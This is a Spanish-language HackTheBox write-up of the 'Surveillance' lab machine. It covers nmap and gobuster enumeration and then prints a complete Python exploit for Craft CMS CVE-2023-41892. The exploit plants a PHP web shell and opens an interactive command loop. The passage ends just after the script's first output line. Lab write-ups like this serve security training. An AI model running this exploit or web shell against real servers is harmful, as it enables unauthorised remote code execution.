<!doctype html><html lang=es><head><title>HTB Surveillance WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackTheBox 'Surveillance' WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Surveillance WriteUp"><meta name=twitter:description content="HackTheBox 'Surveillance' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/surveillance/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Surveillance WriteUp"><meta property="og:description" content="HackTheBox 'Surveillance' WriteUp"><meta property="og:locale" content="es"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-04-20T00:00:00+00:00"><meta property="article:modified_time" content="2024-04-20T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Crackstation"><meta property="article:tag" content="Pivoting"><meta property="article:tag" content="Burpsuite"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/surveillance/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/surveillance/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/surveillance/>HTB Surveillance WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-04-20T00:00:00Z>20 abril, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
19 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/crackstation/>Crackstation</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/pivoting/>Pivoting</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/burpsuite/>Burpsuite</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/powershell/>Powershell</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/craft-cms/>Craft Cms</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/password-cracking/>Password Cracking</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/zoneminder/>Zoneminder</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/netexec/>Netexec</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/crackmapexec/>Crackmapexec</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/medium/>Medium</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/local-port-forwarding/>Local Port Forwarding</a></span></div></div></header><div class=post-content><hr><h1 id=surveillance----hackthebox>Surveillance &ndash; HackTheBox
<a class=heading-link href=#surveillance----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Dificultad: <em>Medium</em> / <em>Media</em></li><li>Plataforma: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Surveillance&rsquo; Avatar" src=/pentesting/images/Surveillance_avatar.png></p><hr><h2 id=usuario>Usuario
<a class=heading-link href=#usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>El scan de<code>Nmap</code> s√≥lo muestra 2 puertos abiertos: <code>22</code> <code>SSH</code> y <code>80</code> <code>HTTP</code>.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80 10.10.11.245 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-18 17:52 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.245
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.31s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT   STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to http://surveillance.htb/
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 16.95 seconds
</span></span></span></code></pre></div><ul><li>Si intentamos visitar la web <code>HTTP</code> corriendo por el puerto <code>80</code> en <code>http://10.10.11.245</code>, somos redirigidos a <code>http://surveillance.htb</code> y la p√°gina no carga. Por esta simple raz√≥n agregamos <code>surveillance.htb</code> a nuestro archivo <code>/etc/hosts</code> corriendo el comando:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo echo &#39;10.10.11.245 surveillance.htb&#39; &gt;&gt; /etc/hosts
</span></span></span></code></pre></div><ul><li>Una vez agregado el dominio a nuestro archivo <code>/etc/hosts</code>, si volvemos a visitar <code>http://surveillance.htb</code> ahora s√≠ podemos ver la p√°gina web:
<img alt=Surveillance_1.png src=/pentesting/images/Surveillance_1.png>
Muchos de los botones en esta p√°gina no funcionan, de manera que sospecho que no hay nada interesante que ver aqu√≠.</li><li>Noto que si visito <code>/index.php</code> √©ste muestra el sitio por defecto, de manera que asumo que el sitio est√° corriendo con <code>PHP</code>. Si intento un <code>Brute Force Directory Listing</code> (encontrar directorios con fuerza bruta) usando <code>Gobuster</code>, buscando tambi√©n por archivos <code>.php</code>, encuentro algunos directorios:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://surveillance.htb -t 55 -x php
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     http://surveillance.htb
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Extensions:              php
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/img                  (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/img/]
</span></span></span><span class=line><span class=cl><span class=go>/images               (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/images/]
</span></span></span><span class=line><span class=cl><span class=go>/index                (Status: 200) [Size: 1]
</span></span></span><span class=line><span class=cl><span class=go>/index.php            (Status: 200) [Size: 16230]
</span></span></span><span class=line><span class=cl><span class=go>/admin                (Status: 302) [Size: 0] [--&gt; http://surveillance.htb/admin/login]
</span></span></span><span class=line><span class=cl><span class=go>/css                  (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/css/]
</span></span></span><span class=line><span class=cl><span class=go>/js                   (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/js/]
</span></span></span><span class=line><span class=cl><span class=go>/logout               (Status: 302) [Size: 0] [--&gt; http://surveillance.htb/]
</span></span></span><span class=line><span class=cl><span class=go>/p1                   (Status: 200) [Size: 16230]
</span></span></span><span class=line><span class=cl><span class=go>/fonts                (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/fonts/]
</span></span></span><span class=line><span class=cl><span class=go>/p3                   (Status: 200) [Size: 16230]
</span></span></span><span class=line><span class=cl><span class=go>/p2                   (Status: 200) [Size: 16230]
</span></span></span></code></pre></div><p>y encuentro un directorio interesante: <code>/admin</code> que redirige al directorio <code>/admin/login</code>. Hay much√≠simos directorios llamados <code>p&lt;n√∫mero></code> como <code>p1</code>, <code>p20</code> y as√≠&mldr; pero todos ellos redirigen a <code>index.php</code> (el sitio por defecto), de manera que los descarto.</p><ul><li>Entonces si visitamos <code>http://surveillance.htb/admin/login</code> este sitio muestra otro panel de login:</li></ul><p><img alt=Surveillance_2.png src=/pentesting/images/Surveillance_2.png></p><p>De manera que el sitio est√° corriendo <code>Craft CMS</code>, un <code>Content Management System</code> &ndash;abreviado com√∫nmente como <code>CMS</code>&ndash; (como lo ser√≠a, por ejemplo, <code>WordPress</code>).</p><ul><li>Si busco por exploits para este <code>CMS</code> usando <code>SearchSploit</code> puedo encontrar algunos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ searchsploit craft cms
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go> Exploit Title                                     |  Path
</span></span></span><span class=line><span class=cl><span class=go>--------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go>Craft CMS 2.6 - Cross-Site Scripting               | php/webapps/42143.txt
</span></span></span><span class=line><span class=cl><span class=go>Craft CMS 2.7.9/3.2.5 - Information Disclosure     | php/webapps/47343.txt
</span></span></span><span class=line><span class=cl><span class=go>Craft CMS 3.0.25 - Cross-Site Scripting            | php/webapps/46054.txt
</span></span></span><span class=line><span class=cl><span class=go>Craft CMS 3.1.12 Pro - Cross-Site Scripting        | php/webapps/46496.txt
</span></span></span><span class=line><span class=cl><span class=go>Craft CMS SEOmatic plugin 3.1.4 - Server-Side Temp | linux/webapps/45108.txt
</span></span></span><span class=line><span class=cl><span class=go>CraftCMS 3 vCard Plugin 1.0.0 - Remote Code Execut | php/webapps/48492.py
</span></span></span><span class=line><span class=cl><span class=go>craftercms 4.x.x - CORS                            | multiple/webapps/51313.txt
</span></span></span><span class=line><span class=cl><span class=go>--------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go>Shellcodes: No Results
</span></span></span></code></pre></div><p>No obstante, de momento no tengo la versi√≥n de √©ste.</p><ul><li>Si le doy una ojeada al c√≥digo fuente de <code>http://surveillance.htb</code> se puede ver algo:
<img alt=Surveillance_3.png src=/pentesting/images/Surveillance_3.png>
de manera que asumo que la versi√≥n de <code>Craft CMS</code> es <code>4.4.14</code>, la cual tristemente no est√° en los exploits mostrados por <code>SearchSploit</code>.</li><li>Pero si googleo <code>Craft CMS 4.4 exploit</code> encuentro que hay una vulnerabilidad catalogada como <code>CVE-2023-41892</code>. De aqu√≠ encuentro 2 sitios interesantes. Uno es un exploit de <code>exploit-db</code> (<a href=https://www.exploit-db.com/exploits/51918 class=external-link target=_blank rel=noopener>https://www.exploit-db.com/exploits/51918</a>) y el otro es <a href=https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce class=external-link target=_blank rel=noopener>de este post de Github</a>. Decido usar este √∫ltimo, el cual es:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=s2>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>writePayloadToTempFile</span><span class=p>(</span><span class=n>documentRoot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;conditions/render&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;configObject[class]&#34;</span><span class=p>:</span> <span class=s2>&#34;craft\elements\conditions\ElementCondition&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;config&#34;</span><span class=p>:</span> <span class=s1>&#39;{&#34;name&#34;:&#34;configObject&#34;,&#34;as &#34;:{&#34;class&#34;:&#34;Imagick&#34;, &#34;__construct()&#34;:{&#34;files&#34;:&#34;msl:/etc/passwd&#34;}}}&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>files</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;image1&#34;</span><span class=p>:</span> <span class=p>(</span><span class=s2>&#34;pwn1.msl&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;image&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;read filename=&#34;caption:&amp;lt;?php @system(@$_REQUEST[&#39;cmd&#39;]); ?&amp;gt;&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;write filename=&#34;info:DOCUMENTROOT/shell.php&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;/image&gt;&#34;&#34;&#34;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;DOCUMENTROOT&#34;</span><span class=p>,</span> <span class=n>documentRoot</span><span class=p>),</span> <span class=s2>&#34;text/plain&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=s2>&#34;http://localhost:8080&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getTmpUploadDirAndDocumentRoot</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;conditions/render&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;configObject[class]&#34;</span><span class=p>:</span> <span class=s2>&#34;craft\elements\conditions\ElementCondition&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;config&#34;</span><span class=p>:</span> <span class=sa>r</span><span class=s1>&#39;{&#34;name&#34;:&#34;configObject&#34;,&#34;as &#34;:{&#34;class&#34;:&#34;</span><span class=se>\\</span><span class=s1>GuzzleHttp</span><span class=se>\\</span><span class=s1>Psr7</span><span class=se>\\</span><span class=s1>FnStream&#34;, &#34;__construct()&#34;:{&#34;methods&#34;:{&#34;close&#34;:&#34;phpinfo&#34;}}}}&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pattern1</span> <span class=o>=</span> <span class=sa>r</span><span class=s1>&#39;&lt;tr&gt;&lt;td class=&#34;e&#34;&gt;upload_tmp_dir&lt;\/td&gt;&lt;td class=&#34;v&#34;&gt;(.*?)&lt;\/td&gt;&lt;td class=&#34;v&#34;&gt;(.*?)&lt;\/td&gt;&lt;\/tr&gt;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>pattern2</span> <span class=o>=</span> <span class=sa>r</span><span class=s1>&#39;&lt;tr&gt;&lt;td class=&#34;e&#34;&gt;\$_SERVER\[</span><span class=se>\&#39;</span><span class=s1>DOCUMENT_ROOT</span><span class=se>\&#39;</span><span class=s1>\]&lt;\/td&gt;&lt;td class=&#34;v&#34;&gt;([^&lt;]+)&lt;\/td&gt;&lt;\/tr&gt;&#39;</span>
</span></span><span class=line><span class=cl>   
</span></span><span class=line><span class=cl>    <span class=n>match1</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>pattern1</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>DOTALL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>match2</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>pattern2</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>DOTALL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>match1</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>),</span> <span class=n>match2</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>trigerImagick</span><span class=p>(</span><span class=n>tmpDir</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;conditions/render&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;configObject[class]&#34;</span><span class=p>:</span> <span class=s2>&#34;craft\elements\conditions\ElementCondition&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;config&#34;</span><span class=p>:</span> <span class=s1>&#39;{&#34;name&#34;:&#34;configObject&#34;,&#34;as &#34;:{&#34;class&#34;:&#34;Imagick&#34;, &#34;__construct()&#34;:{&#34;files&#34;:&#34;vid:msl:&#39;</span> <span class=o>+</span> <span class=n>tmpDir</span> <span class=o>+</span> <span class=sa>r</span><span class=s1>&#39;/php*&#34;}}}&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:8080&#34;</span><span class=p>})</span>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>shell</span><span class=p>(</span><span class=n>cmd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;/shell.php&#34;</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;cmd&#34;</span><span class=p>:</span> <span class=n>cmd</span><span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=k>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;caption:(.*?)CAPTION&#39;</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>DOTALL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=k>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>extracted_text</span> <span class=o>=</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>extracted_text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>extracted_text</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Usage: python CVE-2023-41892.py &lt;url&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>url</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Get temporary folder and document root ...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>upload_tmp_dir</span><span class=p>,</span> <span class=n>documentRoot</span> <span class=o>=</span> <span class=n>getTmpUploadDirAndDocumentRoot</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>tmpDir</span> <span class=o>=</span> <span class=s2>&#34;/tmp&#34;</span> <span class=k>if</span> <span class=n>upload_tmp_dir</span> <span class=o>==</span> <span class=s2>&#34;no value&#34;</span> <span class=k>else</span> <span class=n>upload_tmp_dir</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Write payload to temporary file ...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>writePayloadToTempFile</span><span class=p>(</span><span class=n>documentRoot</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>exceptions</span><span class=o>.</span><span class=n>ConnectionError</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Crash the php process and write temp file successfully&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Trigger imagick to write shell ...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>trigerImagick</span><span class=p>(</span><span class=n>tmpDir</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Done, enjoy the shell&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>cmd</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;$ &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>shell</span><span class=p>(</span><span class=n>cmd</span><span class=p>)</span>
</span></span></code></pre></div><ul><li>Si corro el script no pasa nada:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 CVE_2023_41892.py http://surveillance.htb/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[-] Get temporary folder and document root ...
